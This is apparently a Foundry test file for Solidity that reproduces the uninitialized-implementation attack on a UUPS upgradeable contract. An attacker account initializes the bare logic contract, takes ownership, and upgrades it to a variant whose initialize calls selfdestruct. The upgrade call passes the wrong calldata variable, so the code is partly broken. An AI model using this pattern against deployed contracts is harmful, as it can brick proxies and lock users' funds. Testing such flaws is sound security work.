pragma solidity ^0.8.0;

import {Initializable} from "openzeppelin-contracts-upgradeable-08/proxy/utils/Initializable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable-08/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable-08/access/OwnableUpgradeable.sol";
import {Test, console2} from "forge-std/Test.sol";
import "openzeppelin-contracts-08/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/account.sol";




contract ENGCReferalProgram is Initializable,
                               UUPSUpgradeable,
                               OwnableUpgradeable {

    uint256 number;

    function initialize(uint256 value_) public initializer {
        number = value_;
        __Ownable_init();
    }
    // ...
    function _authorizeUpgrade(
        address newImplementation
    )internal virtual override onlyOwner {}
}

contract ENGCReferalProgramHarm is Initializable,
                               UUPSUpgradeable,
                               OwnableUpgradeable {

    uint256 number;

    function initialize(uint256 value_) public initializer {
        number = value_;
        selfdestruct(payable(msg.sender));
    }
    // ...
    function _authorizeUpgrade(
        address newImplementation
    )internal virtual override onlyOwner {}
}

contract UUPSTest is Test {

    ENGCReferalProgram public rp;
    ENGCReferalProgram public impl;
    ENGCReferalProgram public bad;

    function setUp() public {
        impl = new ENGCReferalProgram();
        bytes memory data = abi.encodeCall(ENGCReferalProgram.initialize, uint256(10));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), data);
        rp = ENGCReferalProgram(address(proxy));
        bad = ENGCReferalProgram(address(new ENGCReferalProgramHarm()));
        //rp.initialize(uint256(10));
        console2.log(rp.owner());
        console2.log(impl.owner());
        vm.startBroadcast(account.ACC_0);
        impl.initialize(100);
        console2.log(impl.owner());
        bytes memory destroyData = abi.encodeCall(ENGCReferalProgram.initialize, uint256(10));
        impl.upgradeToAndCall(address(bad), data);
    }

    function test_Owner() public {
        console2.log(rp.owner());
    }
}